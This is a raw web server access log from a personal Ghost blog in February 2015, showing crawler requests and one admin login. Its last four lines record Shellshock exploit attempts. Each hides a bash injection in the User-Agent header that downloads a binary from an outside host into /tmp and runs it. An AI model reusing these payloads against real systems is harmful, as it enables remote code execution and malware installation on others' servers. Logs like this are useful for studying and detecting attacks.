100.43.85.21 - - [09/Feb/2015:19:30:45 +0000] "GET /robots.txt HTTP/1.1" 200 82 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
100.43.85.21 - - [09/Feb/2015:19:30:47 +0000] "GET /sitemap-pages.xml HTTP/1.1" 200 536 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
100.43.85.21 - - [09/Feb/2015:19:30:49 +0000] "GET /sitemap.xml HTTP/1.1" 200 650 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
100.43.85.21 - - [09/Feb/2015:19:30:51 +0000] "GET /sitemap-posts.xml HTTP/1.1" 200 223 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
100.43.85.21 - - [09/Feb/2015:19:30:53 +0000] "GET /sitemap-authors.xml HTTP/1.1" 200 551 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
100.43.85.21 - - [09/Feb/2015:19:30:55 +0000] "GET /sitemap-tags.xml HTTP/1.1" 200 392 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
67.177.20.127 - - [09/Feb/2015:19:48:25 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
108.61.212.127 - - [09/Feb/2015:20:09:58 +0000] "GET / HTTP/1.1" 200 - "-" "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://play.marketplay.eu/apache23 -O /tmp/apache23;curl -O /tmp/apache23 http://play.marketplay.eu/apache23;chmod 777 /tmp/apache23;cd /tmp/;./apache23 &");'"
108.61.212.127 - - [09/Feb/2015:20:09:58 +0000] "GET /cgi-bin/bash HTTP/1.1" 301 - "-" "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://play.marketplay.eu/apache23 -O /tmp/apache23;curl -O /tmp/apache23 http://play.marketplay.eu/apache23;chmod 777 /tmp/apache23;cd /tmp/;./apache23 &");'"
108.61.212.127 - - [09/Feb/2015:20:09:58 +0000] "GET /cgi-bin/contact.cgi HTTP/1.1" 301 - "-" "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://play.marketplay.eu/apache23 -O /tmp/apache23;curl -O /tmp/apache23 http://play.marketplay.eu/apache23;chmod 777 /tmp/apache23;cd /tmp/;./apache23 &");'"
108.61.212.127 - - [09/Feb/2015:20:09:59 +0000] "GET /cgi-bin/defaultwebpage.cgi HTTP/1.1" 301 - "-" "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://play.marketplay.eu/apache23 -O /tmp/apache23;curl -O /tmp/apache23 http://play.marketplay.eu/apache23;chmod 777 /tmp/apache23;cd /tmp/;./apache23 &");'"
